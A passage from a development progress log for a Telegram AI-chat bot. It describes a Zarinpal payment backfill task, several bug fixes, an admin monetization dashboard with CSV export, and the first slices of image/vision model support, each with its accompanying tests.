`ZARINPAL_BACKFILL_MAX_AGE_HOURS=23` and `PENDING_EXPIRATION_HOURS=24`. Wired into `main.start_webhook_server` directly after the existing `start_pending_expiration_task`, cancelled cleanly on shutdown. New DB query `Database.list_pending_zarinpal_for_backfill(min_age_seconds, max_age_hours, limit)` filters by `gateway='zarinpal' AND status='PENDING'` with both age bounds, orders oldest-first, and coerces the `amount_crypto_or_rial` to a positive integer (filtering NULL / non-finite / non-positive legacy rows so the reaper doesn't crash on a corrupt row). Bundled real bug fix: `metrics.record_loop_tick(name)` now logs a WARN exactly once per process when *name* is not in `_LOOP_METRIC_NAMES`. Pre-fix, a typo'd loop name (e.g. `record_loop_tick("zarinpal_baackfill")`) would silently store the tick but the gauge would never appear in the `/metrics` exposition — Prometheus' "loop is stuck" alert (`time() - last_run_epoch > N`) would then perpetually fire on the (forever-zero) gauge, masquerading as a real outage. The new warning surfaces the typo at the loop's first tick. Tracking set `_LOOP_TICK_UNKNOWN_NAMES_WARNED` is also cleared by `reset_loop_ticks_for_tests` so each test starts fresh. 19 new tests in `tests/test_zarinpal_backfill.py` covering: SQL shape (`gateway='zarinpal'`, status filter, both age bounds, oldest-first ordering, return-shape coercion) / invalid-bounds rejection (`min_age <= 0`, `max_age <= 0`, `limit <= 0`) / NULL+zero+negative IRR row filtering / happy path (verify→finalize→DM→audit) / verify-rejected (no finalize, no DM) / transport-error (no finalize) / finalize-noop (callback raced ahead) / per-row crash isolation / empty result / DB query error / DM failure (TelegramForbiddenError) doesn't block credit / `_read_int_env` unset+garbage+below-minimum / `record_loop_tick` warn-once / no-warn for known names / one warn per distinct unknown name / `zarinpal_backfill` is in `_LOOP_METRIC_NAMES` / reset clears warned set.
* **Designed success / failure HTML pages.** The current `_HTML_SUCCESS` / `_HTML_FAILURE` are intentionally minimal — RTL Persian-only, sans-serif, centered text, no styling beyond a single-color heading. The user is expected to flip back to Telegram for the canonical confirmation. A designer pass with brand colors, a logo, and an English fallback would be a nice-to-have polish.
* **Drop-counter visibility on `/admin/`.** `web_admin._collect_ipn_health` already renders TetraPay + NowPayments tiles. Adding a third tile for Zarinpal is a 5-line `for accessor in (..., zarinpal.get_zarinpal_drop_counters)` extension. Deferred to keep this PR scoped to the gateway integration itself.

Bundled bug fix in this PR (real, found during the Step-E #8 code audit while reading `model_discovery.py` and `fx_rates.py` to understand the env-parsing patterns the new `zarinpal._timeout_seconds` should match): **`model_discovery._DISCOVERY_INTERVAL_SECONDS` was an inline `int(os.getenv(...))` call at module-import time with no try/except and no floor.** Two latent failure modes from that single line: (1) **import-time crash** — a deploy with `DISCOVERY_INTERVAL_SECONDS=abc` (a typo, accidental copy-paste of a quoted value, or a `.env` file with an inline comment that didn't strip cleanly) raised `ValueError: invalid literal for int() with base 10: 'abc'` during the bot's import chain, taking the entire bot off the air on startup with a misleading traceback (the error is in `model_discovery` import, not anywhere near the env-parsing intent); (2) **busy-loop on misconfigured zero / negative** — `DISCOVERY_INTERVAL_SECONDS=0` (a typo for `60` or `600`) returned `0`, `asyncio.sleep(0)` is just a yield, and the discovery loop hammered OpenRouter as fast as the network allowed (likely getting the API key rate-limited within minutes); a negative value silently degraded `asyncio.sleep` to a no-op the same way. **Sister bug** in `fx_rates._parse_int_env`: tolerant of malformed values (`try/except ValueError → default`), but no `minimum` floor — so `FX_REFRESH_INTERVAL_SECONDS=0` would busy-loop the FX refresher hammering Nobitex / the FX upstream. Same regression class, same root cause, same defense missing. Fix: introduced `_parse_positive_int_env(name, default, *, minimum=1)` in `model_discovery.py` (matching the canonical pattern in `pending_expiration._read_int_env`), routed `_DISCOVERY_INTERVAL_SECONDS` and `_MAX_NEW_MODELS_PER_NOTIFICATION` through it, switched the loop from the module-level constant to a fresh `_get_discovery_interval_seconds()` read so a test can monkeypatch the env between cases. Added `minimum: int = 1` keyword arg to `fx_rates._parse_int_env` (default 1) so existing call sites get the floor for free; callers that legitimately want zero opt out via `minimum=0`. Both helpers now log a loud WARNING when clamping or falling back so an operator catches the typo in the deploy logs. 11 new regression tests in `test_zarinpal.py::TestParse{Positive,}IntEnv*` pin the fix at the env-parser level (blank → default, garbage → default, zero → clamped, negative → clamped, valid passthrough, minimum-override-allows-zero) for both helpers. The existing `model_discovery._DISCOVERY_INTERVAL_SECONDS` and `_MAX_NEW_MODELS_PER_NOTIFICATION` module-level constants are kept as initialised-at-import values for backward compat with any external caller (and the existing `test_model_discovery.py` tests that monkeypatch them via `setattr`).

---

Bundled bug fix in this PR: **`pricing._apply_markup` now NaN-guards the token-count side, not just the price side.** Pre-fix, the function had a defensive fallback for non-finite `ModelPrice.input_per_1m_usd` / `output_per_1m_usd` (the comments correctly explained NaN propagation through `raw * markup` / `max(NaN, 0)`) but no guard on the `prompt_tokens` / `completion_tokens` arguments. Those flow in directly from `data["usage"]["prompt_tokens"]` / `["completion_tokens"]` in `ai_engine.chat_with_model`, where Python's stdlib `json.loads` accepts the literal `NaN` token by default — meaning a quirky OpenRouter 200 response (or, more realistically, a misbehaving stub / custom proxy / future internal billing path) with a non-finite token count would propagate NaN through the multiplication, through `raw * markup`, and through `max(NaN, 0.0)` (which returns NaN in CPython because `NaN < 0.0` is False, so `max` treats NaN as the maximum). The downstream impact mirrors the price-side hole: `database.deduct_balance` refuses the NaN cost (its own NaN guard fires), `database.log_usage` likewise refuses — so the user gets free chat AND the audit trail has a hole. Fix: new `_coerce_token_count(value, label)` helper that clamps non-finite, non-numeric, and negative token counts to `0.0` with a logged warning. Six new test cases in `test_pricing.py` pin the fix (NaN prompt / Inf completion / negative both / non-numeric string / happy-path unchanged / zero-input edge / both-corrupt-collapses-to-zero).

---

##### Stage-15-Step-E #9 — what's shipped vs. what remains (STARTED, not finished)

**Step-E #9 (Bot monetization dashboard) — STARTED in PR-after-Step-E-#8b.**

Original spec (Step-E table row 9): "admin page showing revenue vs. OpenRouter cost, profit margin per model, break-even analysis. All data already exists in `usage_logs` + `transactions`."

What's shipped this PR — **the `/admin/monetization` first slice**:

* `database.Database.get_monetization_summary(*, window_days=30, top_models_limit=10)` — new aggregation method computing two scopes (lifetime + trailing 30-day window) of:
    * `revenue_usd` — `SUM(amount_usd_credited)` from `transactions` filtered to `status IN ('SUCCESS', 'PARTIAL')` AND `gateway NOT IN ('admin', 'gift')`. Same exact filter `get_system_metrics` uses for the dashboard's "Total revenue" tile, so the two surfaces never disagree on what counts as revenue (manual admin credits and gift-code redemptions are free credit issued from nothing, NOT earnings).
    * `charged_usd` — `SUM(cost_deducted_usd)` from `usage_logs`, i.e. the marked-up amount we billed users per token.
    * `openrouter_cost_usd` — `charged_usd / pricing.get_markup()`. Derived not stored: we don't keep per-call OpenRouter cost, so the lifetime number assumes the historical rows were charged at *today's* markup. The window number is more reliable (markup changes are rare and the trailing window mostly post-dates them); the template footnotes the assumption.
    * `gross_margin_usd` = `charged_usd - openrouter_cost_usd`. Pure markup income.
    * `gross_margin_pct` = `(markup - 1) / markup * 100`. Constant across rows because markup is global; surfaced anyway for the at-a-glance "what's our margin policy?" line.
    * `net_profit_usd` = `revenue_usd - openrouter_cost_usd`. Forward-looking — assumes every dollar credited will eventually be consumed. A user who topped up $20 and never sent a prompt counts as $20 of revenue and $0 of OpenRouter cost, so net looks great until the credit burns. The template footnote spells this out so an operator doesn't read net as realised profit.
    * `by_model` — top-N rows over the trailing window, **sorted by `charged_usd` DESC** (NOT request count — the dashboard's existing `top_models` already ranks by request count, and ranking by charges surfaces a different question: "where is the margin coming from?", where one expensive call beats 1000 cheap ones).
    * Single round-trip via `pool.acquire` → 4× `fetchval` + 1× `fetch`. ValueErrors raised at parse time for non-positive `window_days` / `top_models_limit` (defense in depth — the SQL uses a `$1::interval` bind so a malformed value can't reach Postgres regardless, but failing loudly is better than "the empty interval"). Markup arithmetic is `markup_for_div = max(markup, 1.0)` so a `markup == 1.0` "operating at-cost" config produces zero margin / zero pct rather than NaN / divide-by-zero. Test pin: `test_get_monetization_summary_handles_unity_markup` exercises the markup=1.0 branch with a $100 revenue / $50 charged dataset, asserts gross_margin_usd == 0, gross_margin_pct == 0, net == 50.
* `web_admin.monetization` — new aiohttp handler + route mount at `/admin/monetization`. Same fail-soft pattern as `dashboard`: DB unreachable / query failure → render the empty-zero shape (`_empty_monetization_summary`) plus an inline "Database query failed" banner instead of 500'ing. Test pins three branches: happy path (lifetime + window blocks render with formatted numbers + per-model rows), DB error banner, dev-mode (no DB wired) banner. Auth gate test confirms an unauthenticated GET 302s to `/admin/login`.
* `templates/admin/monetization.html` — new template. Layout: pricing tile (markup × figure + at-cost vs marked-up explanation) → "Last 30 days" stat grid (revenue / charges / implied OR cost / margin / net) → "Lifetime" stat grid (same five) → "By model — last 30 days" table (model / requests / charged / implied OR cost / margin) → "How to read these numbers" panel that footnotes (a) the gateway-revenue exclusion of admin / gift gateways, (b) the implied-OR-cost assumption that drift on markup changes affects historical rows, (c) the forward-looking nature of net profit. The lifetime panel rendering an empty `<table>` would look broken; the template renders a "No model usage logged in the last 30 days" placeholder instead.
* `templates/admin/_layout.html` — new sidebar entry "💰 Monetization" pointing at `/admin/monetization`, sandwiched between "📊 Dashboard" and "🎟️ Promo codes" so it sits with the other system-wide dashboards rather than the entity-management pages.

Bundled bug fix in this PR (real, found during the Step-E #9 code audit while reading `web_admin._collect_ipn_health` and `metrics.render_metrics` to understand the existing IPN-health surface the new monetization page would need to coexist with): **the Zarinpal drop counters were never wired into either the admin dashboard's IPN-health tile or the Prometheus exposition.** Stage-15-Step-E #8 (PR #126) shipped Zarinpal as the third payment gateway and *did* expose a `get_zarinpal_drop_counters()` accessor mirroring the NowPayments / TetraPay shape (the comment on the helper even explicitly noted "same shape as `get_tetrapay_drop_counters` so a future "add Zarinpal panel" pass to `web_admin._collect_ipn_health` can plug straight in"), but the consumers were not updated as part of that PR. Pre-fix:
* The admin dashboard's "IPN health" tile rendered NowPayments + TetraPay drop counters but completely skipped Zarinpal — an operator debugging a verify-failure spike on the new Iranian gateway had to grep the bot logs to count drops, while the same data was right there for the other two gateways.
* The Prometheus `/metrics` endpoint exposed `meowassist_ipn_drops_total{reason="..."}` (NowPayments) and `meowassist_tetrapay_drops_total{reason="..."}` but no `meowassist_zarinpal_drops_total` family — meaning any alert rule already targeting `meowassist_*_drops_total{reason="bad_signature"}` or similar caught NowPayments forgeries and TetraPay drops but was *blind* to Zarinpal. A Zarinpal merchant-key rotation gone wrong, a `verify_payment` outage, or a flood of `replay` attempts would never trip Prometheus alerting until the operator noticed manually.

This is a latent observability hole from Stage-15-Step-E #8: the data was already being captured (`_bump_zarinpal_drop_counter` is called at the three drop sites in `zarinpal_callback`), and the export accessor existed; only the two consumers needed the import. Fix: extend `web_admin._collect_ipn_health` to call `zarinpal.get_zarinpal_drop_counters()` behind its own `try` (same defensive pattern the NowPayments / TetraPay halves use, so a future regression in one accessor doesn't blank the others), add the third sub-dict + `zarinpal_total` to the returned mapping, render a third Zarinpal section in `templates/admin/dashboard.html` mirroring the existing NowPayments / TetraPay panels (with the same "all-zero" explanatory line + "counters unavailable" fallback), and extend `metrics.render_metrics` to emit a third `meowassist_zarinpal_drops_total{reason="..."}` labelled counter via the existing `_format_labelled_counter` helper. Tests: `test_dashboard_renders_zarinpal_drop_counts`, `test_dashboard_renders_zarinpal_all_zero_message`, `test_collect_ipn_health_includes_zarinpal`, `test_collect_ipn_health_resilient_to_zarinpal_accessor_failure`, `test_render_metrics_zarinpal_drops_renders_with_reason_label`, plus the `meowassist_zarinpal_drops_total` name pinned in the smoke test's `expected_names` list.

What remains for future Step-E #9 PRs:

* ~~**Configurable window selector**~~ ✅ **shipped (Stage-15-Step-E #9 follow-up #1 PR).** The page now accepts `?window=7|30|90` and renders a segmented pill control (7d / 30d / 90d) at the top-right of the "Last N days" panel. Implementation: added `_MONETIZATION_WINDOW_OPTIONS = (7, 30, 90)` allowlist constant + `_parse_monetization_window(raw)` helper that defends against malformed input (non-numeric, out-of-allowlist, negative, zero, `None`, padded, leading-plus, decimal, suffixed) by falling back to `_MONETIZATION_DEFAULT_WINDOW_DAYS=30`. The handler reads `request.query.get("window")`, threads the parsed value into both `db.get_monetization_summary(window_days=...)` AND the template context (`window_options`, `active_window`) so the active pill renders as a non-link `<span>` and the inactive ones as anchors with the correct `?window=N` href. Template gets a small `flex` wrapper around the panel `<h3>` to put the segmented control on the right; CSS for `.window-selector` lives in `templates/admin/base.html` (compact pill row with hover state on the inactive options, themed via the existing `--text` / `--text-muted` / `--border` / `--bg` CSS variables). 23 new tests in `tests/test_web_admin.py` cover the parser (parametrized over 14 input shapes including edge cases), the allowlist constant pin (so a regression that drops one of the conventional windows is caught at test time), the default-window-when-no-query-param happy path (asserts `db.get_monetization_summary` receives `window_days=30`), the allowlisted query (parametrized over 7 / 30 / 90, asserts the heading reflects the active window), the bogus-query fall-back (parametrized over `365` / `abc` / `0` / `-7` / `14` — all coerce to 30), the segmented-control rendering (asserts pills present, active is span, inactive are anchors with correct hrefs), and the bundled bug-fix regression (DB-error path with `markup=2.0` renders `50.00%` not `0.00%`). Total test suite: 1974 → 1997 passing.

  Bundled bug fix in this PR (real, found while writing the window-selector tests and cross-checking the `_empty_monetization_summary` fallback shape): **the DB-error / dev-mode fallback hardcoded `gross_margin_pct=0.0` for both lifetime and window blocks.** Pre-fix, when `db.get_monetization_summary` raised (transient pool issue, asyncpg disconnect, etc.) OR when the page was hit in dev-mode without a DB, the empty-fallback shape returned `gross_margin_pct=0.0` regardless of the configured markup. The pricing tile then rendered "Current markup multiplier: 2.0000× (gross margin pinned at **0.00%** of every charged dollar)" — wildly misleading, because the gross-margin percentage is purely a function of the markup (`(markup - 1) / markup * 100`) and doesn't need transactional data. An operator hitting the page during a 30-second DB blip would see the right markup figure but the wrong margin percentage. Fix: derive `gross_margin_pct` from the `markup` argument inside `_empty_monetization_summary` so the DB-error path matches the happy-path math. Pinned by a parametrized test exercising `markup ∈ {0.0, 1.0, 1.5, 2.0, 4.0}` and a route-level regression test that monkeypatches `pricing.get_markup` and stubs the DB to raise.
* **Daily / weekly time-series chart** — the current page is a snapshot. A small Chart.js (or HTML canvas) sparkline showing daily revenue / OR cost / margin would let an operator spot trends without exporting CSVs.
* ~~**CSV export**~~ ✅ **shipped (Stage-15-Step-E #9 follow-up #2 PR).** New `GET /admin/monetization/export.csv?window=7|30|90` endpoint streams a single CSV with a `scope` column (`lifetime` / `window` / `window_by_model`) so an operator can pivot it for monthly P&L without screen-scraping. Header pinned by the test (`scope, window_days, model, requests, revenue_usd, charged_usd, openrouter_cost_usd, gross_margin_usd, gross_margin_pct, net_profit_usd, markup`); empty cells where a column doesn't apply (model + requests blank for scope-level rows; revenue + margin_pct + net blank for the per-model rows). Honours the same `?window=` allowlist as the HTML page — anything else falls back to 30. Pulls `MONETIZATION_CSV_TOP_MODELS_LIMIT=1000` rows (vs. the on-screen `_MONETIZATION_TOP_MODELS_LIMIT=10`) so the long-tail models are included for offline analysis; `Cache-Control: no-store` and `Content-Disposition: attachment; filename="monetization-{N}d-YYYYMMDDTHHMMSSZ.csv"` so a later admin session on the same machine can't pull a cached copy. Each successful export records a `monetization_export_csv` audit row with the window + row count + db_error flag in `meta`. The HTML page grew an "⬇ Export CSV" link in the page header carrying the active `?window=` into the export. **Bundled bug fix:** `transactions_export_csv` was being recorded by `record_admin_audit` since Stage-9-Step-7 but was missed when the audit-dropdown sweep landed in Stage-15-Step-F follow-up #3 — operators filtering "CSV exports only" couldn't pick the slug out of the audit-page dropdown and had to scroll the full unfiltered feed. Fix: added both `transactions_export_csv` AND `monetization_export_csv` to `AUDIT_ACTION_LABELS`, with a regression test that pins both labels.
* ~~**Per-user contribution** — "top 10 users by revenue contributed in the last 30 days". Requires a join from `transactions` → `users`, similar to the existing `/admin/users` filtering. Useful for "should we reach out to whales?" segmenting.~~ ✅ **shipped (Stage-15-Step-E #9 follow-up #3 PR — top-users-by-revenue panel).** New "Top users by revenue" panel on `/admin/monetization`, scoped to the same trailing window as the by-model table (default 30 days, switchable via the segmented `?window=7|30|90` selector). Each row shows the user's `@username` (linking to `/admin/users/<telegram_id>`) — or the bare telegram id when the username is null — plus their top-up count, total gateway revenue and total wallet charges over the window. Same gateway filter as the scope-level revenue rollup (`status IN ('SUCCESS', 'PARTIAL')` and `gateway NOT IN ('admin', 'gift')`) so the per-user revenue sums to ≤ the window's `revenue_usd`; cross-referencing the two columns surfaces the "are big spenders also big consumers?" question (a user paying $50 with $0 of charges is either over-credited or about to start consuming). Implementation:

  1. `database.get_monetization_summary` grew a `top_users_limit: int = 10` kwarg + a fifth `top_users` list in the returned dict. The new SQL aggregates `transactions` over the window, LEFT JOINs `users` (so a deleted account whose transactions were retained for the audit trail still surfaces — telegram_id stays the row identifier even when the username is gone), and uses a correlated subquery against `usage_logs` to compute the per-user `charged_usd` over the SAME window (one bind for `$1::interval`, re-used in the subquery). Sort is `revenue_usd DESC, t.telegram_id ASC` for stability across snapshots taken seconds apart. Matching `ValueError` guard on the new kwarg (positive int).
  2. `web_admin._empty_monetization_summary` now returns `top_users: []` (so the dev-mode / DB-error fallback path doesn't `KeyError` on the template's iteration). New `_MONETIZATION_TOP_USERS_LIMIT = 10` constant for the on-page panel; new `MONETIZATION_CSV_TOP_USERS_LIMIT = 1000` for the wider CSV tail. Both `monetization` and `monetization_csv_get` thread the limit into `db.get_monetization_summary(top_users_limit=...)`.
  3. `MONETIZATION_CSV_HEADERS` got three new trailing columns — `telegram_id`, `username`, `topup_count` — appended at the end (NOT inserted) so the existing column positions for `lifetime` / `window` / `window_by_model` rows don't shift. Existing scope rows leave the three trailing fields blank; new `window_top_users` rows fill them in. `_format_monetization_csv_rows` grew a fourth row group for `window_top_users`.
  4. New `templates/admin/monetization.html` panel renders between the by-model table and the "How to read these numbers" footer. Empty-state fallback: "No paying users in the last N days (excluding manual credits and gift-code redemptions)." Username falls back to the bare telegram id as the link text when `username` is null; otherwise the secondary `(<id>)` annotation is shown for cross-referencing with the audit log.

  Tests: 6 new DB tests in `tests/test_database_queries.py` (returns shape with `top_users` key; SQL has SUCCESS/PARTIAL filter, admin/gift exclusion, `COALESCE(t.completed_at, t.created_at)` window boundary, `LEFT JOIN users`, `ORDER BY revenue_usd DESC, t.telegram_id ASC` stable sort, correct interval/limit binds; charged subquery scoped to the same window interval; Decimal columns coerced to float; empty-window returns `[]`; default limit is 10), 2 new HTML rendering tests + 2 route plumbing tests in `tests/test_web_admin.py` (panel renders username link and bare-id fallback, money fields with $ + thousands sep + 4 dp; empty-state placeholder rendered when `top_users == []`; HTML route passes `top_users_limit=10`; CSV route passes `top_users_limit=1000`), 4 new CSV tests (header tuple pinned with the three new columns; populated-summary row count = 6; empty top_users skips the row group; non-dict top_users entries dropped; **bundled bug fix** — top_users rows whose `telegram_id` is None or non-int are dropped via `try: int(tid_raw); except (TypeError, ValueError): continue`). 5 existing CSV tests touched to handle the wider header / row layout (added the three blank trailing columns and the window_top_users row count to existing assertions); 3 existing DB tests touched to route the now-two `connection.fetch` calls (one for by_model, one for top_users) by SQL body via a `_route_monetization_fetch` helper. Total test suite: 2570 → 2583 passing.

  Bundled bug fix in this PR (real, found while writing the CSV defence-in-depth tests for malformed `top_users` payloads): `_format_monetization_csv_rows` had no defence around per-user rows missing a `telegram_id`. The DB layer's contract today is "telegram_id is the FK so it can't be NULL", but a buggy stub or a future schema migration that loosened that constraint would otherwise emit a CSV row with an empty identifier in the `telegram_id` column — which an operator importing into Excel would silently mis-attribute to whichever row sorted adjacently (Excel preserves blanks but the eye doesn't). Fix: drop such rows defensively (mirrors the existing `if not isinstance(model_row, dict): continue` defence on by_model). Pinned by `test_monetization_csv_rows_drop_top_users_without_telegram_id` over the three failure modes (`None`, non-int string, valid int).
* **Markup history tracking** — record `COST_MARKUP` changes in a small `markup_changes` table so the implied-OR-cost calculation can use the markup that was active when each `usage_logs` row was created, rather than today's markup uniformly. Removes the lifetime-drift caveat.
* **Break-even analysis** — given current monthly run-rate (revenue, OR cost, fixed overhead from env), how many active users / requests does the bot need to break even? Out-of-scope for the data model right now since "fixed overhead" isn't anywhere in the schema.

---

##### Stage-15-Step-E #10 — what's shipped vs. what remains (STARTED, not finished)

**Step-E #10 (Image / vision model support) — STARTED in PR-after-Step-E-#9.**

Original spec (Step-E table row 10): "let users send photos and have vision models (GPT-4V, Claude 3) analyze them. OpenRouter supports multimodal; need to handle Telegram photo downloads + base64 encoding in `ai_engine`."

What's shipped this PR — **the `vision.py` foundation slice**. The image / vision feature spans three surfaces (a new Telegram photo-message handler, encoding/payload-assembly helpers, and an integration into `ai_engine.chat_with_model`); landing them all in one PR would be a sprawling diff and a partial implementation would render in production as "user sends a photo, bot ignores it" (worse than the current "bot replies to caption only" because unique information is silently dropped). This PR carves off the pure-helper foundation so the rest can land cleanly in a follow-up:

* `vision.py` — new module ~280 LoC, no third-party deps:
    * `VisionError(reason, message)` exception carrying a machine-readable `reason` slug — same shape as `ZarinpalError` / `TetraPayError` so a future caller that wants a per-process drop counter can read `err.reason` directly without string-parsing.
    * `MAX_IMAGE_BYTES` (default 5 MiB, env-overridable via `VISION_MAX_IMAGE_BYTES`, minimum 1 KiB) — cap on raw image payload size. The base64 encoded form is ~33% larger but still comfortably under any reasonable HTTP body limit.
    * `MAX_IMAGES_PER_MESSAGE` (default 4, env-overridable via `VISION_MAX_IMAGES_PER_MESSAGE`, minimum 1) — max images riding along with one user message. Picked to match the strictest known cap (Anthropic's Claude allows 5; we go conservative).
    * Both env helpers route through a local `_parse_positive_int_env` (same pattern as `model_discovery._parse_positive_int_env` and `pending_expiration._read_int_env`) — blank → default, unparseable → default + WARN, below minimum → clamped + WARN.
    * `is_vision_capable_model(model_id) -> bool` — case-insensitive substring match against a tuple of known vision-capable model patterns covering OpenAI (gpt-4-vision / gpt-4-turbo / gpt-4o / o1 / chatgpt-4o), Anthropic Claude 3 family (Haiku/Sonnet/Opus + 3.5 + 3.7), Google Gemini 1.5+ + Gemini 2 + gemini-pro-vision + gemini-flash, Meta Llama 3.2 vision (90B + 11B), Mistral Pixtral, Qwen-VL family, plus a "vision" wildcard escape hatch that catches future model slugs without a code edit. Conservative direction — false-positive (claim vision support, get a 400 from OpenRouter) is recoverable; false-negative (refuse to send the image to a model that actually supports vision) is silently lossy. Empty / non-string / corrupted `users.active_model` rows return False rather than raising — the safe text-only fallback is the default.
    * `encode_image_data_uri(image_bytes, content_type="image/jpeg") -> str` — pure function returning `"data:<mime>;base64,..."`. Accepts both `bytes` and `bytearray` (Telegram's `Bot.download(...)` returns bytearray). Validates: non-empty, ≤ MAX_IMAGE_BYTES, mime in the OpenAI-documented allowlist (`image/jpeg`, `image/png`, `image/gif`, `image/webp` — HEIC / SVG / AVIF rejected so we don't burn tokens on a 400 the user has no way to debug). Mime is normalised case + whitespace before the allowlist check.
    * `build_multimodal_user_message(prompt, image_data_uris) -> dict` — pure function returning the OpenAI/OpenRouter chat-completions multimodal user-message dict: `{"role": "user", "content": [{"type": "text", "text": "..."}, {"type": "image_url", "image_url": {"url": "data:..."}}, ...]}`. Text part comes first by convention. Allows text-only (empty image list, falls back to a normal text user-message), image-only (empty prompt, returns content with only `image_url` parts), but rejects fully-empty (both empty → 400 at most providers). Validates each URI starts with `data:image/` and contains `;base64,` so a typo doesn't reach OpenRouter as a wasted token-burn 400.
* `tests/test_vision.py` — new test file with 80+ test cases pinning every branch end-to-end: known-vision id recognition (parametrised over 27 representative ids), known-text-only id rejection (13 cases), case-insensitive matching, invalid-input handling, encode happy-path round-trip + all four allowed mime types, mime normalisation, oversize / empty / unsupported-mime rejection, exactly-at-cap acceptance, bytearray acceptance, multi-image ordering preservation, max-images cap, invalid URI rejection (HTTP URL / non-image / missing base64 separator / empty / None / int), and env-override semantics (override, unparseable falls back to default, below-minimum clamps).

Bundled bug fix in this PR (real, found during the Step-E #10 code audit while reading `ai_engine.chat_with_model` to figure out where the future vision-payload assembly will plug in): **persistence after charge can lose the AI reply, leading to silent double-billing for memory-enabled users.** Pre-fix, the two `db.append_conversation_message` calls at lines 316-317 of `ai_engine.py` lived inside the function's outer `try` block at line 149. If either INSERT raised — most concretely a `\x00` NUL byte in `user_prompt` or `reply_text`, which Postgres TEXT rejects with `invalid byte sequence for encoding "UTF8": 0x00` (and Telegram does allow U+0000 in user messages); also any transient DB hiccup, a deadlock, or an FK violation if the user row was deleted concurrently — the exception would bubble out to the broad `except Exception` at line 321, the user would see `t(lang, "ai_transient_error")`, and `reply_text` would be lost. But by that point in the flow the wallet had ALREADY been debited at line 293 (`deduct_balance`) and the usage_log row had ALREADY been written at line 306 (`log_usage`), so the user's natural retry would re-charge them. Net: a memory-enabled user happens to send a NUL-bearing prompt → wallet debited, no reply, retry → wallet debited again, no reply, the bug self-perpetuates as long as the user keeps including that NUL. Fix: wrap the two `append_conversation_message` calls in a local try/except. Persistence is best-effort — losing one turn from the memory buffer is far better than double-billing them; the next turn re-establishes context naturally because the *current* prompt the user just paid for is the one that matters most. Logged loud-and-once at ERROR level so ops can spot the row corruption / DB issue and repair without grepping every chat handler. Three new regression tests in `test_ai_engine.py` (`test_memory_persist_failure_does_not_lose_reply`, `test_memory_persist_assistant_failure_does_not_lose_reply`, `test_memory_disabled_skips_persist_entirely`) pin the user-side raise, the assistant-side raise, and the no-persist-when-memory-off path so a future refactor that re-introduces the wrap-with-broad-try regression is caught at PR time.

**Step-E #10 second slice (PR-after-Step-E-#10-foundation) — STARTED, vision integration shipped**.

Building on the foundation slice (PR #129), this PR wires the helpers into the user-visible flow:

* `handlers.py` — new `@router.message(F.photo)` handler (`process_photo`) mirroring the structure of `process_chat` (token-bucket rate limit → in-flight slot → typing action → response chunking) so the two paths stay in lockstep. Pre-flight gates fire in this order: drop-on-no-from-user → consume_chat_token → try_claim_chat_slot → user-row lookup (no row → `ai_no_account`) → vision-capability pre-check (text-only model → `ai_model_no_vision`, **before** the Telegram CDN download to save the round-trip) → `_download_photo_to_bytes` (largest `PhotoSize`, BytesIO sink, returns None on `TelegramAPIError` / no file_path / empty buffer) → `vision.encode_image_data_uri(..., "image/jpeg")` (Telegram serves photos as JPEG; PNG/WEBP/GIF arrive as `document` and don't reach this handler) → `chat_with_model(user_id, caption_or_empty, image_data_uris=[uri])`. `VisionError` from the encoder is mapped to a localised slug via `_vision_error_localised` (oversize_image → `ai_image_oversize`, unsupported_mime → `ai_image_unsupported_format`, empty/invalid → `ai_image_download_failed`, too_many_images → `ai_image_too_many` with `{max_images}` placeholder, anything unrecognised → `ai_provider_unavailable`). The slot is released in a `finally` block — exception-safe, idempotent.
* `ai_engine.chat_with_model` — accepts a new keyword-only `image_data_uris: list[str] | None = None` parameter. Keyword-only on purpose so the existing 19+ positional-arg call sites in tests / production keep working unchanged. When non-empty AND `vision.is_vision_capable_model(active_model)` → payload assembled via `vision.build_multimodal_user_message`. When non-empty AND the model is NOT vision-capable → returns `t(lang, "ai_model_no_vision")` *before* any wallet debit or OpenRouter call (the gate fires before `insufficient_balance`/`free_messages` checks too — a user with empty wallet should not be told "top up" when topping up wouldn't help). A `VisionError` raised by `build_multimodal_user_message` (caller bypassed handler-side validation) is caught and surfaces as `ai_provider_unavailable` rather than crashing the poller.
* `strings.py` — new keys in both `fa` and `en`: `ai_model_no_vision` (active model can't see images, pick a vision-capable one), `ai_image_oversize`, `ai_image_unsupported_format`, `ai_image_too_many` (with `{max_images}` placeholder), `ai_image_download_failed`. Localised, parity-checked at module import.
* `tests/test_process_photo.py` — new file with 18 tests pinning the handler end-to-end: happy path with caption, picks-largest-PhotoSize, empty-caption-allowed, drops-on-no-from-user, rate-limited path, busy-slot path, no-user-row → `ai_no_account`, non-vision-model short-circuit (download NOT attempted), download-failure → `ai_image_download_failed`, oversize-image → `ai_image_oversize`, slot release on success / on exception, long-reply chunking, empty-reply fallback, plus four direct unit tests for the `_download_photo_to_bytes` helper covering `TelegramAPIError`, missing `file_path`, no-photo-attribute, and the happy bytes round-trip.
* `tests/test_ai_engine.py` — six new tests (`test_vision_gate_rejects_non_vision_model_no_charge`, `test_vision_gate_passes_for_vision_capable_model`, `test_vision_payload_assembly_uses_multimodal_shape`, `test_vision_invalid_uri_returns_provider_unavailable`, `test_vision_no_images_keyword_keeps_text_payload_shape`, `test_vision_empty_list_treated_as_no_images`) pinning the gate ordering, multimodal payload shape, and backward compatibility.

What remains for future Step-E #10 PRs (the user-visible feature is now end-to-end functional; the items below are quality-of-life follow-ups):

* ✅ **Memory persistence for image turns** — shipped in Stage-15-Step-E #10 follow-up #2. New Alembic migration `0018_image_data_uris.py` adds a nullable `image_data_uris JSONB` column to `conversation_messages` (instant ALTER on PG 11+ for an additive nullable column — no table rewrite, safe to apply on a hot table). `Database.append_conversation_message` accepts a keyword-only `image_data_uris: list[str] | None = None`; non-empty lists are JSON-encoded and cast server-side via `$N::jsonb` (same pattern as `record_payment_status_transition`). `Database.get_recent_messages` reads the new column and reconstructs the OpenAI/OpenRouter multimodal user-message shape (`content` is a list of `{type: "text", ...}` / `{type: "image_url", ...}` parts) for non-null vision rows; text-only rows return the legacy plain-string content shape so the prompt-assembly path is unchanged. Empty image lists normalise to NULL on write. New `_decode_jsonb_str_list` sibling helper to `_decode_jsonb_meta` — fail-soft on malformed JSONB (returns None + logged WARN) so a single poisoned row doesn't blank the whole memory buffer. Image-only turns (empty caption + image) round-trip without an empty text part — some providers reject empty content blocks. Assistant rows always render as text-only (the column applies to both roles for future-proofing, but no current model emits images in its reply). `ai_engine.chat_with_model` now passes `image_data_uris=...` through to the `append_conversation_message` user-row write so a memory-enabled vision turn replays *with* visual context on the next turn. 27 new tests in `test_database_queries.py` (round-trip, mixed text/JSONB rows, malformed JSONB → fall-back, all-invalid list rejection, ordering preservation, single + 